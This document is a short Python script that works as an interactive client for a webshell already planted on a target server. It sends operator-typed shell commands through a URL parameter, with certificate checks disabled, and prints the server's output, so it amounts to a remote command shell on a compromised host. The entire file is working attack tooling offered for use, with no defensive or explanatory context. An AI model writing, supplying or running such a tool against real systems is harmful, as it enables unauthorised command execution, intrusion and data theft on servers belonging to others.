#!/usr/bin/python3

import requests
import sys

# Usage Info
if len(sys.argv) < 3:
    print("[INFO] Usage: python3 %s http://<Target IP>/<Webshell Name> <Command Parameter>" % sys.argv[0])
    sys.exit()

# Connection Test
def connect(ip):
    try:
        r = requests.get(ip)
        if r.status_code == 200:
            print("[INFO] Connection successful")
        else:
            print("[ERROR] Connection error")

    except:
        print("[ERROR] Connection error")
        sys.exit()

# Interactive Shell using the Existing WebShell
def interactive(ip, cmdParam):
    while True:
        try:
            cmd = input("[WEBSHELL]> ")
            if cmd == 'exit':
                print("[INFO] Exit")
                raise KeyboardInterrupt
            r = requests.get(ip + "?" + cmdParam + "=" + cmd, verify=False)
            if r.status_code == 200:
                print(r.text)
            else:
                raise Exception
        except KeyboardInterrupt:
            sys.exit()
        
if __name__ == '__main__':
    ip = sys.argv[1]
    cmdParam = sys.argv[2]

    connect(ip)
    interactive(ip, cmdParam)
